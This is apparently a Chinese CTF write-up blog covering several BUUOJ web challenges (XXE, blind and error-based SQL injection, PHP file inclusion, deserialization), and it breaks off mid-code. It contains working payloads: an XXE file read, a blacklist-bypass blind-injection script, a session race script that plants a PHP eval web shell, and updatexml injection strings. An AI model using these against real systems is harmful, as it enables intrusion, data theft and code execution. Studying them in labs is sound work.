id="lt-NCTF2019-gt-Fake-XML-cookbook"><a href="#lt-NCTF2019-gt-Fake-XML-cookbook" class="headerlink" title="&lt;NCTF2019&gt;Fake XML cookbook"></a>&lt;NCTF2019&gt;Fake XML cookbook</h1><p>首先从题目名字已经很明显了，就是XXE，打开题目是登录界面，抓包，发现回显的数据是提交的用户名，对用户名进行外部实体声明，最终发现<code>flag</code>就在根目录下</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" ?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">a</span><span class="token punctuation">[</span><span class="token internal-subset">&lt;!ENTITY b SYSTEM "file:///flag"></span><span class="token punctuation">]</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&b;">&amp;b;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="lt-NCTF2019-gt-SQLi"><a href="#lt-NCTF2019-gt-SQLi" class="headerlink" title="&lt;NCTF2019&gt;SQLi"></a>&lt;NCTF2019&gt;SQLi</h1><p>打开题目</p><blockquote><p>sqlquery : select * from users where username=’’ and passwd=’’</p></blockquote><p>存在<code>robots.txt</code>，得到提示</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$black_list</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"/limit|by|substr|mid|,|admin|benchmark|like|or|char|union|substring|select|greatest|%00|\'|=| |in|&lt;|>|-|\.|\(\)|#|and|if|database|users|where|table|concat|insert|join|having|sleep/i"</span><span class="token punctuation">;</span><span class="token keyword">If</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'passwd'</span><span class="token punctuation">]</span> <span class="token operator">===</span> admin's password<span class="token punctuation">,</span>Then you will get the flag<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>过滤了单引号，但没有过滤转义符号，还是可以逃逸的，php是可以<code>%00</code>截断的版本</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">username=\&amp;passwd=||(1);%00<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>得到</p><blockquote><p><strong>HTTP/1.1 302 Found</strong><br>Server: openresty<br>Date: Wed, 01 Dec 2021 09:17:49 GMT<br>Content-Type: text/html<br>Content-Length: 2228<br>Connection: close<br><strong>Location: welcome.php</strong><br>X-Powered-By: PHP/5.2.16</p></blockquote><p>根据提示需要获取admin的密码，显然是布尔盲注了</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">from</span> urllib <span class="token keyword">import</span> parseurll<span class="token operator">=</span><span class="token string">"http://6cd4da7b-0239-4646-a44a-8ef97233503e.node4.buuoj.cn:81"</span>dataa<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"username"</span><span class="token punctuation">:</span><span class="token string">"\\"</span><span class="token punctuation">,</span><span class="token string">"passwd"</span><span class="token punctuation">:</span><span class="token string">""</span><span class="token punctuation">&#125;</span>passwd<span class="token operator">=</span><span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">">"</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> w <span class="token keyword">in</span> <span class="token string">"qwertyuioplkjhgfdsazxcvbnmAQZXSWEDCVFRTGBNHYUJMKIOLP1234567890_"</span><span class="token punctuation">:</span>        payload<span class="token operator">=</span><span class="token string-interpolation"><span class="token string">f"||(passwd/**/regexp/**/\"^</span><span class="token interpolation"><span class="token punctuation">&#123;</span>passwd<span class="token punctuation">&#125;</span></span><span class="token interpolation"><span class="token punctuation">&#123;</span>w<span class="token punctuation">&#125;</span></span><span class="token string">\");"</span></span><span class="token operator">+</span>parse<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span><span class="token string">"%00"</span><span class="token punctuation">)</span>        dataa<span class="token punctuation">[</span><span class="token string">"passwd"</span><span class="token punctuation">]</span><span class="token operator">=</span>payload        response<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>urll<span class="token punctuation">,</span>data<span class="token operator">=</span>dataa<span class="token punctuation">,</span>allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> response<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">302</span><span class="token punctuation">:</span>            passwd<span class="token operator">+=</span>w            <span class="token keyword">print</span><span class="token punctuation">(</span>passwd<span class="token punctuation">)</span>            <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>提交密码，得到flag</p><h1 id="lt-NPUCTF2020-gt-ezinclude"><a href="#lt-NPUCTF2020-gt-ezinclude" class="headerlink" title="&lt;NPUCTF2020&gt;ezinclude"></a>&lt;NPUCTF2020&gt;ezinclude</h1><p>打开题目</p><blockquote><p>username/password error</p></blockquote><p>扫描目录</p><blockquote><p>config.php<br>dir.php<br>index.php<br>index.php/login</p></blockquote><p>在网页源码中得到提示</p><blockquote><p>&lt;!–md5($secret.$name)===$pass –&gt;</p></blockquote><p>发现在请求头的<code>Cookie</code>中有一个<code>Hash</code>值，一般来说，那多半就是<code>md5(\$secret.\$name)</code>的值，也就是<code>pass</code>要等于这个<code>Hash</code>值，直接借着<code>Cookie</code>里的<code>Hash</code>值，传参，跳转到一个404界面</p><p>还是请求头，有一个</p><blockquote><p>Referer: <a href="http://cec81b70-7911-472d-bff7-8dd27ac459ad.node4.buuoj.cn:81/flflflflag.php">http://cec81b70-7911-472d-bff7-8dd27ac459ad.node4.buuoj.cn:81/flflflflag.php</a></p></blockquote><p>尝试访问，得到</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">language</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>javascript<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">           window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href<span class="token operator">=</span><span class="token string">"404.html"</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>this_is_not_fl4g_and_出题人_wants_girlfriend<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>&lt;><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>include($_GET["file"])<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>利用伪协议读取<br>flflflflag.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">language</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>javascript<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">           window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href<span class="token operator">=</span><span class="token string">"404.html"</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>this_is_not_fl4g_and_出题人_wants_girlfriend<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>&lt;><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$file</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/data|input|zip/is'</span><span class="token punctuation">,</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'nonono'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>@<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'include($_GET["file"])'</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>config.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$secret</span><span class="token operator">=</span><span class="token string single-quoted-string">'%^$&amp;$#fffdflag_is_not_here_ha_ha'</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>dir.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">scandir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/tmp'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>index.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span> <span class="token string single-quoted-string">'config.php'</span><span class="token punctuation">;</span>@<span class="token variable">$name</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>@<span class="token variable">$pass</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pass'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$secret</span><span class="token operator">.</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token variable">$pass</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;script language="javascript" type="text/javascript">           window.location.href="flflflflag.php";&lt;/script>'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Hash"</span><span class="token punctuation">,</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$secret</span><span class="token operator">.</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">3600000</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"username/password error"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token comment">&lt;!--md5($secret.$name)===$pass --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这个<code>dir.php</code>，很难不让人联想到利用<code>session</code>条件竞争写木马</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> io<span class="token keyword">from</span> threading <span class="token keyword">import</span> Thread<span class="token keyword">from</span> time <span class="token keyword">import</span> sleepur<span class="token operator">=</span><span class="token string">'http://9fe5d7d0-6a86-40a8-b6e3-6a6ed9d00084.node4.buuoj.cn:81/flflflflag.php'</span>dat<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"PHP_SESSION_UPLOAD_PROGRESS"</span><span class="token punctuation">:</span><span class="token string">"&lt;?php fputs(fopen('a.php','w'),'&lt;?php eval($_GET[door])?>');?>"</span><span class="token punctuation">&#125;</span>fil<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'file'</span><span class="token punctuation">:</span><span class="token punctuation">(</span><span class="token string">'a.txt'</span><span class="token punctuation">,</span>io<span class="token punctuation">.</span>BytesIO<span class="token punctuation">(</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">1024</span><span class="token operator">*</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>cooki<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'PHPSESSID'</span><span class="token punctuation">:</span><span class="token string">'abc'</span><span class="token punctuation">&#125;</span>par<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'file'</span><span class="token punctuation">:</span><span class="token string">'/tmp/sess_abc'</span><span class="token punctuation">&#125;</span>ses<span class="token operator">=</span>requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">Upload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> ses<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>ur<span class="token punctuation">,</span>data<span class="token operator">=</span>dat<span class="token punctuation">,</span>files<span class="token operator">=</span>fil<span class="token punctuation">,</span>cookies<span class="token operator">=</span>cooki<span class="token punctuation">,</span>allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">.</span>status_code<span class="token operator">!=</span><span class="token number">200</span><span class="token punctuation">:</span>            sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>a<span class="token operator">=</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>Upload<span class="token punctuation">)</span>a<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    ses<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>ur<span class="token punctuation">,</span>params<span class="token operator">=</span>par<span class="token punctuation">,</span>allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><del>蚁剑连接即可</del><br>flag在<code>phpinfo</code>里</p><h1 id="lt-NPUCTF2020-gt-ReadlezPHP"><a href="#lt-NPUCTF2020-gt-ReadlezPHP" class="headerlink" title="&lt;NPUCTF2020&gt;ReadlezPHP"></a>&lt;NPUCTF2020&gt;ReadlezPHP</h1><p>打开题目，无提示，扫描目录，无果，在源代码里搜索<code>php</code>，发现隐藏链接</p><p>打开得到源码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">#error_reporting(0);</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">HelloPhp</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$a</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$b</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">a</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"Y-m-d h:i:s"</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">b</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"date"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">a</span><span class="token punctuation">;</span>        <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">b</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$b</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HelloPhp</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'source'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>@<span class="token variable">$ppp</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"data"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>简单的反序列化题<br>尝试<code>system</code>和<code>exec</code>无果，应该是被禁用了，<code>assert</code>可行，在<code>phpinfo</code>界面看到大部分执行系统命令的函数被禁用了</p><p><del>flag就在phinfo里是我没想到的</del></p><h1 id="lt-RCTF2015-gt-EasySQL"><a href="#lt-RCTF2015-gt-EasySQL" class="headerlink" title="&lt;RCTF2015&gt;EasySQL"></a>&lt;RCTF2015&gt;EasySQL</h1><p>打开题目，测试功能。<br>注册，登录，修改密码，那么极有可能存在二次注入。<br>经过测试，发现如果注册的用户名含有双引号，在修改密码后页面回显报错信息。例如</p><blockquote><p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘“a”” and pwd=’72ea3f1e65a1d2b8046e7fb756498dbd’’ at line 1</p></blockquote><p>不难猜测语句为</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token keyword">where</span> username<span class="token operator">=</span><span class="token string">"..."</span> <span class="token operator">and</span> pwd<span class="token operator">=</span><span class="token string">'...'</span> <span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>由于无其他查询回显页面，尝试报错注入</p><p>库名</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">aaaaa"||updatexml(1,(concat(0x7e,(database()),0x7e)),1)#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>XPATH syntax error: ‘~web_sqli~’</p></blockquote><p>表名</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">aaaaa"<span class="token operator">||</span>updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token punctuation">(</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token punctuation">(</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">from</span><span class="token punctuation">(</span>information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span><span class="token punctuation">)</span><span class="token keyword">where</span><span class="token punctuation">(</span>table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>XPATH syntax error: ‘~article,flag,users~’</p></blockquote><p>列名</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">bbbb"<span class="token operator">||</span>updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token punctuation">(</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token punctuation">(</span>group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">from</span><span class="token punctuation">(</span>information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span><span class="token punctuation">)</span><span class="token keyword">where</span><span class="token punctuation">(</span>table_name<span class="token operator">=</span><span class="token string">'flag'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>XPATH syntax error: ‘<del>flag</del>‘</p></blockquote><p>数据</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">ddddd"<span class="token operator">||</span>updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token punctuation">(</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token punctuation">(</span>group_concat<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">from</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>XPATH syntax error: ‘~RCTF{Good job! But flag not her’</p></blockquote><p>虚晃一枪，能看出来是截断的，显示16个字符<br>最终发现flag是在表<code>users</code>里，截断函数都被过滤了，没有过滤<code>reverse()</code></p><p>前半段</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">ddddd"<span class="token operator">||</span>updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token punctuation">(</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token punctuation">(</span>group_concat<span class="token punctuation">(</span>real_flag_1s_here<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">from</span><span class="token punctuation">(</span>users<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>XPATH syntax error: ‘~xxx,xxx,xxx,xxx,xxx,xxx,xxx,xxx’</p></blockquote><p>可以发现有其他字符干扰，没法完全读取，正则函数未被过滤，尝试使用正则</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">ddddd"<span class="token operator">||</span>updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token punctuation">(</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token punctuation">(</span>real_flag_1s_here<span class="token punctuation">)</span><span class="token keyword">from</span><span class="token punctuation">(</span>users<span class="token punctuation">)</span><span class="token keyword">where</span><span class="token punctuation">(</span>real_flag_1s_here<span class="token punctuation">)</span><span class="token operator">regexp</span><span class="token punctuation">(</span><span class="token string">'^flag'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>配合<code>reverse()</code>得到flag</p><h1 id="lt-SUCTF-2019-gt-Pythonginx"><a href="#lt-SUCTF-2019-gt-Pythonginx" class="headerlink" title="&lt;SUCTF 2019&gt;Pythonginx"></a>&lt;SUCTF 2019&gt;Pythonginx</h1><p>打开题目，得到部分源码</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/getUrl'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">getUrl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"url"</span><span class="token punctuation">)</span>    host <span class="token operator">=</span> parse<span class="token punctuation">.</span>urlparse<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>hostname    <span class="token keyword">if</span> host <span class="token operator">==</span> <span class="token string">'suctf.cc'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"我扌 your problem? 111"</span>    parts <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>urlsplit<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">)</span>    host <span class="token operator">=</span> parts<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> host <span class="token operator">==</span> <span class="token string">'suctf.cc'</span><span 